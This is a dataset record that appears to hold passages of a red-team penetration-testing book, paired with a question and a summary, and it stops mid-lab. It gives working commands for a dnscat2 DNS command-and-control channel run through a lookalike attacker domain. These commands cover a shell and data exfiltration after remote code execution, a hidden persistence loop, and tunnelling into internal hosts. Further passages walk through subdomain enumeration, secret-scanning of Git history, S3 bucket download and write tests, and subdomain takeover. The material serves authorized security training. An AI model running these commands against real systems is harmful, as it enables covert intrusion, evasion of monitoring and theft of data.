libssl1.0.0_1.0.1t-1+deb7u3_amd64.deb\nwget\nhttp://security.ubuntu.com/ubuntu/pool/main/i/icu/libicu55_55.1-\n7ubuntu0.3_amd64.deb\ndpkg -i libicu55_55.1-7ubuntu0.3_amd64.deb\nwget\nhttps://github.com/PowerShell/PowerShell/releases/download/v6.0.2/powershell_6.0.2-\n1.ubuntu.16.04_amd64.deb\ndpkg -i powershell_6.0.2-1.ubuntu.16.04_amd64.deb\ndnscat2\nThis tool is designed to create an encrypted Command and Control (C2) channel\nover the DNS protocol, which is an effective tunnel out of almost every network\n[https://github.com/iagox86/dnscat2].\nC2 and exfiltration over DNS provides a great mechanism to hide your traffic,\nevade network sensors, and get around network restrictions. In many restrictive\nor production environments, we come across networks that either do not allow\noutbound traffic or traffic that is heavily restricted/monitored. To get around\nthese protections, we can use a tool like dnscat2. The reason we are focusing on\ndnscat2 is because it does not require root privileges and allows both shell access\nand exfiltration.\nIn many secure environments, direct outbound UDP or TCP is restricted. Why\nnot leverage the services already built into the infrastructure? Many of these\nprotected networks contain a DNS server to resolve internal hosts, while also\nallowing resolutions of external resources. By setting up an authoritative server\nfor a malicious domain we own, we can leverage these DNS resolutions to\nperform Command and Control of our malware.\nIn our scenario, we are going to set up our attacker domain called\n“loca1host.com”. This is a doppelganger to “localhost” in the hopes that we can\nhide our traffic a little bit more. Make sure to replace “loca1host.com” to the\ndomain name you own. We are going to configure loca1host.com's DNS\ninformation so it becomes an Authoritative DNS server. In this example, we are\ngoing to use GoDaddy's DNS configuration tool, but you can use any DNS\nservice.\nSetting Up an Authoritative DNS Server using GoDaddy\nFirst, make sure to set up a VPS server to be your C2 attacking server\nand get the IP of that server\nLog into your GoDaddy (or similar) account after purchasing a\ndomain\nSelect your domain, click manage, and select Advanced DNS\nNext, set up Hostnames in the DNS Management to point to your\nServer\nns1 (and put the IP of your VPS server)\nns2 (and put the IP of your VPS server)\nEdit Nameservers to Custom\nAdd ns1.loca1host.com\nAdd ns2.loca1host.com\nAs seen in the image above, we now have our nameservers pointing to\nns1.loca1host.com and ns2.loca1host.com, which both point to our attacker VPS\nserver. If you try to resolve any subdomain for loca1host.com (i.e.\nvpn.loca1host.com), it will try to use our VPS server to perform those\nresolutions. Luckily for us, dnscat2 listens on UDP port 53 and does all the\nheavy lifting for us.\nNext, we are going to need to fully set up our attacker server that is acting as our\nnameserver. Setting up the dnscat2 Server:\nsudo su -\napt-get update\napt-get install ruby-dev\ngit clone https://github.com/iagox86/dnscat2.git\ncd dnscat2/server/\napt-get install gcc make\ngem install bundler\nbundle install\nTest to make sure it works: ruby ./dnscat2.rb\nQuick Note: If you are using Amazon Lightsail, make sure to allow\nUDP port 53\nFor the client code, we will need to compile it to make a binary for a Linux\npayload.\nCompiling the Client\ngit clone https://github.com/iagox86/dnscat2.git optdnscat2/client\ncd optdnscat2/client/\nmake\nWe should now have a dnscat binary created!\n(If in Windows: Load client/win32/dnscat2.vcproj into Visual Studio\nand hit \"build\")\nNow that we have our authoritative DNS configured, our attacker server running\ndnscat2 as a DNS server, and our malware compiled, we are ready to execute our\npayload.\nBefore we begin, we need to start dnscat on our attacker server. Although there\nare multiple configurations to enable, the main one is configuring the --secret\nflag to make sure our communication within the DNS requests are encrypted.\nMake sure to replace loca1host.com with the domain name you own and create a\nrandom secret string.\nTo start the dncat2 on your attacker server:\nscreen\nruby ./dnscat2.rb loca1host.com --secret 39dfj3hdsfajh37e8c902j\nLet's say you have some sort of RCE on a vulnerable server. You are able to run\nshell commands and upload our dnscat payload. To execute our payload:\n./dnscat loca1host.com --secret 39dfj3hdsfajh37e8c902j\nThis will start dnscat, use our authoritative server, and create our C2 channel.\nOne thing I have seen is that there are times when dnscat2 dies. This could be\nfrom large file transfers or something just gets messed up. To circumvent these\ntypes of issues, I like to make sure that my dnscat payload returns. For this, I\ngenerally like to start my dnscat payload with a quick bash script:\nnohup binbash -c \"while true; do optdnscat2/client/dnscat\nloca1host.com --secret 39dfj3hdsfajh37e8c902j --max-retransmits 5;\nsleep 3600; done\" > devnull 2>&1 &\nThis will make sure that if the client side payload dies for any reason, it will\nspawn a new instance every hour. Sometimes you only have one chance to get\nyour payloads to run, so you need to make them count!\nLastly, if you are going to run this payload on Windows, you could use the\ndnscat2 payload or… why not just do it in PowerShell?! Luke Baggett wrote up\na PowerShell version of the dnscat client here:\nhttps://github.com/lukebaggett/dnscat2-powershell.\nThe dnscat2 Connection\nAfter our payload executes and connects back to our attacker server, we should\nsee a new ENCRYPTED AND VERIFIED message similar to below. By typing\n\"window\" dnscat2 will show all of your sessions. Currently, we have a single\ncommand session called \"1\".\nWe can spawn a terminal style shell by interacting with our command session:\nInteract with our first command sessions\nwindow -i 1\nStart a shell sessions\nshell\nBack out to the main session\nCtrl-z\nInteract with the 2 session - sh\nwindow -i 2\nNow, you should be able to run all shell commands (i.e. ls)\nAlthough this isn't the fastest shell, due to the fact that all communication is over\nDNS, it really gets around those situations where a Meterpreter or similar shell\njust won't work. What is even better about dnscat2 is that it fully supports\ntunneling. This way, if we want to use an exploit from our host system, use a\nbrowser to tunnel internal websites, or even SSH into another box, it is all\npossible.\nTunnel in dnscat2\nThere are many times we want to route our traffic from our attacker server\nthrough our compromised host, to other internal servers. The most secure way\nto do this with dnscat2 is to route our traffic through the local port and then\ntunnel it to an internal system on the network. An example of this can be\naccomplished by the following command inside our command session:\nlisten 127.0.0.1:9999 10.100.100.1:22\nOnce the tunnel is created, we can go back to our root terminal window on our\nattacker machine, SSH to localhost over port 9999, and authenticate to an\ninternal system on the victim's network.\nThis will provide all sorts of fun and a great test to see if your customer's\nnetworks can detect massive DNS queries and exfiltration. So, what do the\nrequest and responses look like? A quick Wireshark dump shows that dnscat2\ncreates massive amounts of different DNS requests to many different long\nsubdomains.\nNow, there are many other protocols that you might want to test. For example,\nNishang has a PowerShell based ICMP Shell (http://bit.ly/2GXhdnZ) that uses\nhttps://github.com/inquisb/icmpsh as the C2 server. There are other ICMP shells\nlike https://github.com/jamesbarlow/icmptunnel,\nhttps://github.com/DhavalKapil/icmptunnel and http://code.gerade.org/hans/.\np0wnedShell\nAs stated on p0wnedShell’s Github page, this tool is “an offensive PowerShell\nhost application written in C# that does not rely on powershell.exe but runs\npowershell commands and functions within a powershell runspace environment\n(.NET). It has a lot of offensive PowerShell modules and binaries included to\nmake the process of Post Exploitation easier. What we tried was to build an “all\nin one” Post Exploitation tool which we could use to bypass all mitigations\nsolutions (or at least some off), and that has all relevant tooling included. You\ncan use it to perform modern attacks within Active Directory environments and\ncreate awareness within your Blue team so they can build the right defense\nstrategies.” [https://github.com/Cn33liz/p0wnedShell]\nPupy Shell\nPupy is “an opensource, cross-platform (Windows, Linux, OSX, Android)\nremote administration and post-exploitation tool mainly written in python.”\n[https://github.com/n1nj4sec/pupy].\nOne of the awesome features of Pupy is that you can run Python across all of\nyour agents without having a Python actually installed on all of your hosts. So,\nif you are trying to script out a lot of your attacks in a custom framework, Pupy\nis an easy tool with which to do this.\nPoshC2\nPoshC2 is “a proxy aware C2 framework written completely in PowerShell to\naid penetration testers with red teaming, post-exploitation and lateral movement.\nThe tools and modules were developed off the back of our successful\nPowerShell sessions and payload types for the Metasploit Framework.\nPowerShell was chosen as the base language as it provides all of the\nfunctionality and rich features required without needing to introduce multiple\nlanguages to the framework.” [https://github.com/nettitude/PoshC2]\nMerlin\nMerlin (https://github.com/Ne0nd0g/merlin) takes advantage of a recently\ndeveloped protocol called HTTP/2 (RFC7540). Per Medium, \"HTTP/2\ncommunications are multiplexed, bi-direction connections that do not end after\none request and response. Additionally, HTTP/2 is a binary protocol that makes\nit more compact, easy to parse, and not human readable without the use of an\ninterpreting tool.” [https://medium.com/@Ne0nd0g/introducing-merlin-\n645da3c635a#df21]\nMerlin is a tool written in GO, looks and feels similar to PowerShell Empire, and\nallows for a lightweight agent. It doesn't support any types of post exploitation\nmodules, so you will have to do it yourself.\nNishang\nNishang (https://github.com/samratashok/nishang) is a framework and collection\nof scripts and payloads which enables usage of PowerShell for offensive\nsecurity, penetration testing and Red Teaming. Nishang is useful during all\nphases of penetration testing.\nAlthough Nishang is really a collection of amazing PowerShell scripts, there are\nsome scripts for lightweight Command and Control.\nConclusion\nNow, you are finally prepared to head into battle with all of your tools and\nservers configured. Being ready for any scenario will help you get around any\nobstacle from network detection tools, blocked protocols, host based security\ntools, and more.\nFor the labs in this book, I have created a full Virtual Machine based on Kali\nLinux with all the tools. This VMWare Virtual Machine can be found here:\nhttp://thehackerplaybook.com/get.php?type=THP-vm. Within the THP\narchive, there is a text file named List_of_Tools.txt which lists all the added\ntools. The default username/password is the standard root/toor.",
    "question": "What are the key tools and techniques used by Red Teams to simulate real-world attacks and evade detection systems?",
    "summary": "The Red Team uses various tools to simulate real-world attacks and test defenses. Metasploit is a core tool for generating payloads, while Cobalt Strike is favored for post-exploitation and C2 communication. PowerShell Empire and dnscat2 are also essential, offering secure, stealthy methods for command and control and exfiltration. Additionally, tools like Nishang, Pupy, and Merlin provide advanced capabilities for bypassing detection and conducting sophisticated attacks."
  },
  {
    "start": 18,
    "end": 29,
    "text": "2 before the snap - red team recon\nIn the last THP, the Before The Snap section focused on using different tools\nsuch as Recon-NG, Discover, Spiderfoot, Gitrob, Masscan, Sparta, HTTP\nScreenshot, Vulnerability Scanners, Burp Suite and more. These were tools that\nwe could use either externally or internally to perform reconnaissance or\nscanning of our victim's infrastructure. We are going to continue this tradition\nand expand on the reconnaissance phase from a Red Team perspective.\nMonitoring an Environment\nFor Red Team campaigns, it is often about opportunity of attack. Not only do\nyou need to have your attack infrastructure ready at a whim, but you also need to\nbe constantly looking for vulnerabilities. This could be done through various\ntools that scan the environments, looking for services, cloud misconfigurations,\nand more. These activities allow you to gather more information about the\nvictim’s infrastructure and find immediate avenues of attack.\nRegular Nmap Diffing\nFor all our clients, one of the first things we do is set up different monitoring\nscripts. These are usually just quick bash scripts that email us daily diffs of a\nclient's network. Of course, prior to scanning, make sure you have proper\nauthorization to perform scanning.\nFor client networks that are generally not too large, we set up simple cronjob to\nperform external port diffing. For example, we could create a quick Linux bash\nscript to do the hard work (remember to replace the IP range):\n#!/bin/bash\nmkdir optnmap_diff\nd=$(date +%Y-%m-%d)\ny=$(date -d yesterday +%Y-%m-%d)\nusrbin/nmap -T4 -oX optnmap_diff/scan_$d.xml 10.100.100.0/24 >\ndevnull 2>&1\nif [ -e optnmap_diff/scan_$y.xml ]; then\nusrbin/ndiff optnmap_diff/scan_$y.xml\noptnmap_diff/scan_$d.xml > optnmap_diff/diff.txt\nfi\nThis is a very basic script that runs nmap every day using default ports and then\nuses ndiff to compare the results. We can then take the output of this script and\nuse it to notify our team of new ports discovered daily.\nIn the last book, we talked heavily about the benefits of Masscan\n(https://github.com/robertdavidgraham/masscan) and how much faster it is than\nnmap. The developers of Masscan stated that, with a large enough network\npipeline, you could scan the entire internet in 6 minutes. The one issue we have\nseen is with Masscan's reliability when scanning large ranges. It is great for\ndoing our initial reconnaissance, but generally isn't used for diffing.\nLab:\nLabs in THP3 are completely optional. In some sections, I have included\naddition labs to perform testing or for areas that you can expand on. Since this is\nall about learning and finding your own passion, I highly recommend you spend\nthe time to make our tools better and share it with the community.\nBuild a better network diff scanner:\nBuild a better port list than the default nmap (i.e. nmap default\nmisses ports like Redis 6379/6380 and others)\nImplement nmap banners\nKeep historical tracking of ports\nBuild email alerting/notification system\nCheck out diff Slack Alerts: http://bit.ly/2H1o5AW\nWeb Screenshots\nOther than regularly scanning for open ports/services, it is important for Red\nTeams to also monitor for different web applications. We can use two tools to\nhelp monitor for application changes.\nThe first web screenshot tool that we commonly use is HTTPScreenshot\n(https://github.com/breenmachine/httpscreenshot). The reason HTTPScreenshot\nis so powerful is that it uses Masscan to scan large networks quickly and uses\nphantomjs to take screencaptures of any websites it detects. This is a great way\nto get a quick layout of a large internal or external network.\nPlease remember that all tool references in this book are run from the THP\nmodified Kali Virtual Machine. You can find the Virtual Machine here:\nhttp://thehackerplaybook.com/get.php?type=THP-vm. The username password\nis the default: root/toor.\ncd opthttpscreenshot/\nEdit the networks.txt file to pick the network you want to scan:\ngedit networks.txt\n./masshttp.sh\nfirefox clusters.html\nThe other tool to check out is Eyewitness\n(https://github.com/ChrisTruncer/EyeWitness). Eyewitness is another great\ntool that takes an XML file from nmap output and screenshots webpages, RDP\nservers, and VNC Servers.\nLab:\ncd optEyeWitness\nnmap [IP Range]/24 --open -p 80,443 -oX scan.xml\npython ./EyeWitness.py -x scan.xml --web\nCloud Scanning\nAs more and more companies switch over to using different cloud\ninfrastructures, a lot of new and old attacks come to light. This is usually due to\nmisconfigurations and a lack of knowledge on what exactly is publicly facing on\ntheir cloud infrastructure. Regardless of Amazon EC2, Azure, Google cloud, or\nsome other provider, this has become a global trend.\nFor Red Teamers, a problem is how do we search on different cloud\nenvironments? Since many tenants use dynamic IPs, their servers might not\nonly change rapidly, but they also aren’t listed in a certain block on the cloud\nprovider. For example, if you use AWS, they own huge ranges all over the\nworld. Based on which region you pick, your server will randomly be dropped\ninto a /13 CIDR range. For an outsider, finding and monitoring these servers\nisn't easy.\nFirst, it is important to figure out where the IP ranges are owned by different\nproviders. Some of the examples are:\nAmazon: http://bit.ly/2vUSjED\nAzure: http://bit.ly/2r7rHeR\nGoogle Cloud: http://bit.ly/2HAsZFm\nAs you can tell these ranges are huge and scanning them manually would be\nvery hard to do. Throughout this chapter, we will be reviewing how we can gain\nthe information on these cloud systems.\nNetwork/Service Search Engines\nTo find cloud servers, there are many great resources freely available on the\ninternet to perform reconnaissance on our targets. We can use everything from\nGoogle all the way to third party scanning services. Using these resources will\nallow us to dig into a company and find information about servers, open\nservices, banners, and other details passively. The company will never know\nthat you queried for this type of information. Let’s see how we use some of\nthese resources as Red Teamers.\nShodan\nShodan (https://www.shodan.io) is a great service that regularly scans the\ninternet, grabbing banners, ports, information about networks, and more. They\neven have vulnerability information like Heartbleed. One of the most fun uses\nfor Shodan is looking through open web cams and playing around with them.\nFrom a Red Team perspective, we want to find information about our victims.\nA Few Basic Search Queries:\ntitle: Search the content scraped from the HTML tag\nhtml: Search the full HTML content of the returned page\nproduct: Search the name of the software or product identified in the\nbanner\nnet: Search a given netblock (example: 204.51.94.79/18)\nWe can do some searches on Shodan for cyberspacekittens:\ncyberspacekittens.com\nSearch in the Title HTML Tag\ntitle:cyberspacekittens\nSearch in the Context of the page\nhtml:cyberspacekittens.com\nNote, I have noticed that Shodan is a little slow in its scans. It took more than a\nmonth to get my servers scanned and put into the Shodan database.\nCensys.io\nCensys continually monitors every reachable server and device on the Internet,\nso you can search for and analyze them in real time. You will be able to\nunderstand your network attack surface, discover new threats, and assess their\nglobal impact [https://censys.io/]. One of the best features of Censys is that it\nscrapes information from SSL certificates. Typically, one of the major\ndifficulties for Red Teamers is finding where our victim's servers are located on\ncloud servers. Luckily, we can use Censys.io to find this information as they\nalready parse this data.\nThe one issue we have with these scans is that they can sometime be days or\nweeks behind. In this case, it took one day to get scanned for title information.\nAdditionally, after creating an SSL certificate on my site, it took four days for\nthe information to show up on the Censys.io site. In terms of data accuracy,\nCensys.io was decently reliable.\nBelow, we ran scans to find info about our target cyberspacekittens.com. By\nparsing the server's SSL certificate, we were able to identify that our victim's\nserver was hosted on AWS.\nThere is also a Censys script tool to query it via a scripted process:\nhttps://github.com/christophetd/censys-subdomain-finder.\nManually Parsing SSL Certificates\nWe commonly find that companies do not realize what they have available on\nthe internet. Especially with the increase of cloud usage, many companies do\nnot have ACLs properly implemented. They believe that their servers are\nprotected, but we discover that they are publicly facing. These include Redis\ndatabases, Jenkin servers, Tomcat management, NoSQL databases, and more –\nmany of which led to remote code execution or loss of PII.\nThe cheap and dirty way to find these cloud servers is by manually scanning\nSSL certificates on the internet in an automated fashion. We can take the list of\nIP ranges for our cloud providers and scan all of them regularly to pull down\nSSL certificates. Looking at the SSL certs, we can learn a great deal about an\norganization. From the scan below of the cyberspacekittens range, we can see\nhostnames in certificates with .int. for internal servers, .dev. for development,\nvpn. for VPN servers, and more. Many times you can gain internal hostnames\nthat might not have public IPs or whitelisted IPs for their internal networks.\nTo assist in scanning for hostnames in certificates, sslScrape was developed for\nTHP3. This tool utilizes Masscan to quickly scan large networks. Once it\nidentifies services on port 443, it then strips the hostnames in the certificates.\nsslScrape (https://github.com/cheetz/sslScrape):\ncd optsslScrape\npython ./sslScrape.py [IP Address CIDR Range]\nExamples of Cloud IP Addresses:\nAmazon: http://bit.ly/2vUSjED\nAzure: http://bit.ly/2r7rHeR\nGoogle Cloud: http://bit.ly/2HAsZFm\nThroughout this book, I try to provide examples and an initial framework.\nHowever, it is up to you to develop this further. I highly recommend you take\nthis code as a start, save all hostnames to a database, make a web UI frontend,\nconnect additional ports that might have certs like 8443, and maybe even look\nfor some vulnerabilities like .git/.svn style repos.\nSubdomain Discovery\nIn terms of identifying IP ranges, we can normally look up the company from\npublic sources like the American Registry for Internet Numbers (ARIN) at\nhttps://www.arin.net/. We can look up IP address space to owners, search\nNetworks owned by companies, Autonomous System Numbers by organization,\nand more. If we are looking outside North America, we can look up via\nAFRINIC (Africa), APNIC (Asia), LACNIC (Latin America), and RIPE NCC\n(Europe). These are all publicly available and listed on their servers.\nYou can look up any hostname or FQDN to find the owner of that domain\nthrough many available public sources (one of my favorites to quickly lookup\nownership is https://centralops.net/co/domaindossier.aspx). What you can't find\nlisted anywhere are subdomains. Subdomain information is stored on the target's\nDNS server versus registered on some central public registration system. You\nhave to know what to search for to find a valid subdomain.\nWhy are subdomains so important to find for your victim targets? A few reasons\nare:\nSome subdomains can indicate the type of server it is (i.e. dev, vpn,\nmail, internal, test). For example, mail.cyberspacekittens.com.\nSome servers do not respond by IP. They could be on shared\ninfrastructure and only respond by fully qualified domains. This is\nvery common to find on cloud infrastructure. So you can nmap all\nday, but if you can’t find the subdomain, you won't really know what\napplications are behind that IP.\nSubdomains can provide information about where the target is\nhosting their servers. This is done by finding all of a company's\nsubdomains, performing reverse lookups, and finding where the IPs\nare hosted. A company could be using multiple cloud providers and\ndatacenters.\nWe did a lot of discovery in the last book, so let's review some of the current and\nnew tools to perform better discovery. Feel free to join in and scan the\ncyberspacekittens.com domain.\nDiscover Scripts\nDiscover Scripts (https://github.com/leebaird/discover) tool is still one of my\nfavorite recon/discovery tools discussed in the last book. This is because it\ncombines all the recon tools on Kali Linux and is maintained regularly. The\npassive domain recon will utilize all the following tools: Passive uses ARIN,\ndnsrecon, goofile, goog-mail, goohost, theHarvester, Metasploit, URLCrazy,\nWhois, multiple websites, and recon-ng.\ngit clone https://github.com/leebaird/discover optdiscover/\ncd optdiscover/\n./update.sh\n./discover.sh\nDomain\nPassive\n[Company Name]\n[Domain Name]\nfirefox rootdata/[Domain]/index.htm\nThe best part of Discover scripts is that it takes the information it gathers and\nkeeps searching based on that information. For example, from searching\nthrough the public PGP repository it might identify emails and then use that\ninformation to search Have I Been Pwned (through Recon-NG). That will let us\nknow if any passwords have been found through publicly-released compromises\n(which you will have to find on your own).\nKNOCK\nNext, we want to get a good idea of all the servers and domains a company\nmight use. Although there isn’t a central place where subdomains are stored, we\ncan bruteforce different subdomains with a tool, such as Knock, to identify what\nservers or hosts might be available for attack.\nKnockpy is a python tool designed to enumerate subdomains on a target domain\nthrough a wordlist.\nKnock is a great subdomain scan tool that takes a list of subdomains and checks\nit to see if it resolves. So if you have cyberspacekittens.com, Knock will take\nthis wordlist (http://bit.ly/2JOkUyj), and see if there are any subdomains for\n[subdomain].cyberspacekittens.com. Now, the one caveat here is that it is only\nas good as your word list. Therefore, having a better wordlist increases your\nchances of finding subdomains.\nOne of my favorite subdomains is created by jhaddix and is located here:\nhttp://bit.ly/2qwxrxB. Subdomains are one of those things that you should\nalways be collecting. Some other good lists can be found on your THP Kali\nimage under optSecLists or here:\nhttps://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS.\nLab:\nFind all the subdomains for cyberspacekittens.com:\ncd optknock/knockpy\npython ./knockpy.py cyberspacekittens.com\nThis uses the basic wordlist from Knock. Try downloading and\nusing a much larger wordlist. Try using the http://bit.ly/2qwxrxB list\nusing the -u switch. (i.e. python ./knockpy.py cyberspacekittens.com\n-u all.txt).\nWhat types of differences did you find from Discover scripts? What types of\ndomains would be your first targets for attacks or used with spearphishing\ndomain attacks? Go and give it a try in the real world. Go find a bug bounty\nprogram and look for juicy-looking subdomains.\nSublist3r\nAs previously mentioned, the problem with Knock is that it is only as good as\nyour wordlist. Some companies have very unique subdomains that can't be\nfound through a common wordlist. The next best resource to go to are search\nengines. As sites get spidered, files with links get analyzed and scraped public\nresources become available, which means we can use search engines to do the\nhard work for us.\nThis is where we can use a tool like Sublist3r. Note, using a tool like this uses\ndifferent \"google dork\" style search queries that can look like a bot. This could\nget you temporarily blacklisted and require you to fill out a captcha with every\nrequest, which may limit the results from your scan. To run Sublister:\ncd optSublist3r\npython sublist3r.py -d cyberspacekittens.com -o\ncyberspacekittens.com\nNotice any results that might have never been found from subdomain\nbruteforcing? Again, try this against a bug bounty program to see significant\ndifferences between bruteforcing and using search engines.\n*There is a forked version of Sublist3r that also performs subdomain checking:\nhttps://github.com/Plazmaz/Sublist3r.\nSubBrute\nThe last subdomain tool is called SubBrute. SubBrute is a community-driven\nproject with the goal of creating the fastest, and most accurate subdomain\nenumeration tool. Some of the magic behind SubBrute is that it uses open\nresolvers as a kind of proxy to circumvent DNS rate-limiting (https://www.us-\ncert.gov/ncas/alerts/TA13-088A). This design also provides a layer of\nanonymity, as SubBrute does not send traffic directly to the target's name\nservers. [https://github.com/TheRook/subbrute]\nNot only is SubBrute extremely fast, it performs a DNS spider feature that\ncrawls enumerated DNSrecords. To run SubBrute:\ncd optsubbrute\n./subbrute.py cyberspacekittens.com\nWe can also take SubBrute to the next level and combine it with MassDNS to\nperform very high-performance DNS resolution (http://bit.ly/2EMKIHg).\nGithub\nGithub is a treasure trove of amazing data. There have been a number of\npenetration tests and Red Team assessments where we were able to get\npasswords, API keys, old source code, internal hostnames/IPs, and more. These\neither led to a direct compromise or assisted in another attack. What we see is\nthat many developers either push code to the wrong repo (sending it to their\npublic repository instead of their company’s private repository), or accidentally\npush sensitive material (like passwords) and then try to remove it. One good\nthing with Github is that it tracks every time code is modified or deleted. That\nmeans if sensitive code at one time was pushed to a repository and that sensitive\nfile is deleted, it is still tracked in the code changes. As long as the repository is\npublic, you will be able to view all of these changes.\nWe can either use Github search to identify certain hostnames/organizational\nnames or even just use simple Google Dork search, for example:\nsite:github.com + \"cyberspacekittens”.\nTry searching bug bounty programs using different organizations instead of\nsearching for cyberspacekittens for the following examples.\nThrough all your searching, you come across:\nhttps://github.com/cyberspacekittens/dnscat2 (modified example for GitHub\nlab). You can manually take a peek at this repository, but usually it will be so\nlarge that you will have a hard time going through all of the projects to find\nanything juicy.\nAs mentioned before, when you edit or delete a file in Github, everything is\ntracked. Fortunately for Red Teamers, many people forget about this feature.\nTherefore, we often see people put sensitive information into Github, delete it,\nand not realize it's still there! Let's see if we can find some of these gems.\nTruffle Hog\nTruffle Hog tool scans different commit histories and branches for high entropy\nkeys, and prints them. This is great for finding secrets, passwords, keys, and\nmore. Let's see if we can find any secrets on cyberspacekittens' Github\nrepository.\nLab:\ncd opttrufflehog/truffleHog\npython truffleHog.py https://github.com/cyberspacekittens/dnscat2\nAs we can see in the commit history, AWS keys and SSH keys were removed\nfrom server/controller/csk.config, but if you look at the current repo, you won't\nfind this file: https://github.com/cheetz/dnscat2/tree/master/server/controller.\nEven better (but a little more complicated to set up) is git-all-secrets from\n(https://github.com/anshumanbh/git-all-secrets). Git-all-secrets is useful when\nlooking through large organizations. You can just point to an organization and\nhave it clone the code locally, then scan it with Trufflehog and repo-supervisor.\nYou will first need to create a Github Access Token, which is free by creating a\nGithub and selecting Generate New Token in the settings.\nTo run git-all-secrets:\ncd optgit-all-secrets\ndocker run -it abhartiya/tools_gitallsecrets:v3 -\nrepoURL=https://github.com/cyberspacekittens/dnscat2 -token=[API\nKey] -output=results.txt\nThis will clone the repo and start scanning. You can even run\nthrough whole organizations in Github with the -org flag.\nAfter the container finishes running, retrieve the container ID by\ntyping:\ndocker ps -a\nOnce you have the container ID, get the results file from the\ncontainer to the host by typing:\ndocker cp <container-id>:/data/results.txt .\nCloud\nAs we spoke prior, cloud is one area where we see a lot of companies improperly\nsecuring their environment. The most common issues we generally see are:\nAmazon S3 Missing Buckets:\nhttps://hackerone.com/reports/121461\nAmazon S3 Bucket Permissions:\nhttps://hackerone.com/reports/128088\nBeing able to list and write files to public AWS buckets:\naws s3 ls s3://[bucketname]\naws s3 mv test.txt s3://[bucketname]\nLack of Logging\nBefore we can start testing misconfigurations on different AWS buckets, we\nneed to first identify them. We are going to try a couple different tools to see\nwhat we can discover on our victim’s AWS infrastructure.\nS3 Bucket Enumeration\nThere are many tools that can perform S3 bucket enumeration for AWS. These\ntools generally take keywords or lists, apply multiple permutations, and then try\nto identify different buckets. For example, we can use a tool called Slurp\n(https://github.com/bbb31/slurp) to find information about our target\nCyberSpaceKittens:\ncd optslurp\n./slurp domain -t cyberspacekittens.com\n./slurp keyword -t cyberspacekittens\nBucket Finder\nAnother tool, Bucket Finder, will not only attempt to find different buckets, but\nalso download all the content from those buckets for analysis:\nwget https://digi.ninja/files/bucket_finder_1.1.tar.bz2 -O\nbucket_finder_1.1.tar.bz2\ncd optbucket_finder\n./bucket_finder.rb --region us my_words --download\nYou have been running discovery on Cyber Space Kittens’ infrastructure and\nidentify one of their S3 buckets (cyberspacekittens.s3.amazonaws.com). What\nare your first steps in retrieving what you can and cannot see on the S3 bucket?\nYou can first pop it into a browser and see some information:\nPrior to starting, we need to create an AWS account to get an Access Key ID.\nYou can get yours for free at Amazon here:\nhttps://aws.amazon.com/s/dm/optimization/server-side-test/free-tier/free_np/.\nOnce you create an account, log into AWS, go to Your Security Credentials\n(https://amzn.to/2ItaySR), and then to Access Keys. Once you have your AWS\nAccess ID and Secret Key, we can query our S3 buckets.\nQuery S3 and Download Everything:\nInstall awscli\nsudo apt install awscli\nConfigure Credentials\naws configure\nLook at the permissions on CyberSpaceKittens' S3 bucket\naws s3api get-bucket-acl --bucket cyberspacekittens\nRead files from the S3 Bucket\naws s3 ls s3://cyberspacekittens\nDownload Everything in the S3 Bucket\naws s3 sync s3://cyberspacekittens .\nOther than query S3, the next thing to test is writing to that bucket. If we have\nwrite access, it could allow complete RCE of their applications. We have often\nseen that when files stored on S3 buckets are used on all of their pages (and if\nwe can modify these files), we can put our malicious code on their web\napplication servers.\nWriting to S3:\necho \"test\" > test.txt\naws s3 mv test.txt s3://cyberspacekittens\naws s3 ls s3://cyberspacekittens\n*Note, write has been removed from the Everyone group. This was just for\ndemonstration.\nModify Access Controls in AWS Buckets\nWhen analyzing AWS security, we need to review the controls around\npermissions on objects and buckets. Objects are the individual files and buckets\nare logical units of storage. Both of these permissions can potentially be\nmodified by any user if provisioned incorrectly.\nFirst, we can look at each object to see if these permissions are configured\ncorrectly:\naws s3api get-object-acl --bucket cyberspacekittens --key ignore.txt\nWe will see that the file is only writeable by a user named “secure”. It is not\nopen to everyone. If we did have write access, we could use the put-object in\ns3api to modify that file.\nNext, we look to see if we can modify the buckets themselves. This can be\naccomplished with:\naws s3api get-bucket-acl --bucket cyberspacekittens\nAgain, in both of these cases, READ is permissioned globally, but\nFULL_CONTROL or any write is only allowed by an account called “secure”.\nIf we did have access to the bucket, we could use the --grant-full-control to give\nourselves full control of the bucket and objects.\nResources:\nhttps://labs.detectify.com/2017/07/13/a-deep-dive-into-aws-s3-\naccess-controls-taking-full-control-over-your-assets/\nSubdomain Takeovers\nSubdomain takeovers are a common vulnerability we see with almost every\ncompany these days. What happens is that a company utilizes some third party\nCMS/Content/Cloud Provider and points their subdomains to these platforms. If\nthey ever forget to configure the third party service or deregister from that\nserver, an attacker can take over that hostname with the third party.\nFor example, you register an S3 Amazon Bucket with the name\ntestlab.s3.amazonaws.com. You then have your company’s subdomain\ntestlab.company.com point to testlab.s3.amazonaws.com. A year later, you no\nlonger need the S3 bucket testlab.s3.amazonaws.com and deregister it, but forget\nthe CNAME redirect for testlab.company.com. Someone can now go to AWS\nand set up testlab.s3.amazon.com and have a valid S3 bucket on the victim’s\ndomain.\nOne tool to check for vulnerable subdomains is called tkosubs. We can use this\ntool to check whether any of the subdomains we have found pointing to a CMS\nprovider (Heroku, Github, Shopify, Amazon S3, Amazon CloudFront, etc.) can\nbe taken over.\nRunning tkosubs:\ncd opttkosubs/\n./tkosubs -domains=list.txt -data=providers-data.csv -\noutput=output.csv\nIf we do find a dangling CNAME, we can use tkosubs to take over Github Pages\nand Heroku Apps. Otherwise, we would have to do it manually. Two other\ntools that can help with domain takeovers are:\nHostileSubBruteforcer\n(https://github.com/nahamsec/HostileSubBruteforcer)\nautoSubTakeover (https://github.com/JordyZomer/autoSubTakeover)\nWant to learn more about AWS vulnerabilities? A great CTF AWS\nWalkthrough: http://flaws.cloud/.\nEmails\nA huge part of any social engineering attack is to find email addresses and\nnames of employees. We used Discover Script in the previous chapters, which\nis great for collecting much of this data. I usually start with Discover scripts and\nbegin digging into the other tools. Every tool does things slightly differently and\nit is beneficial to use as many automated processes as you can.\nOnce you get a small list of emails, it is good to understand their email format.\nIs it firstname.lastname @cyberspacekitten.com or is it first initial.lastname\n@cyberspacekittens.com? Once you can figure out their format, we can use\ntools like LinkedIn to find more employees and try to identify their email\naddresses.\nSimplyEmail\nWe all know that spear phishing is still one of the more successful avenues of\nattack. If we don’t have any vulnerabilities from the outside, attacking users is\nthe next step. To build a good list of email addresses, we can use a tool like\nSimplyEmail. The output of this tool will provide the email address format of\nthe company and a list of valid users\nLab:\nFind all email accounts for cnn.com\ncd 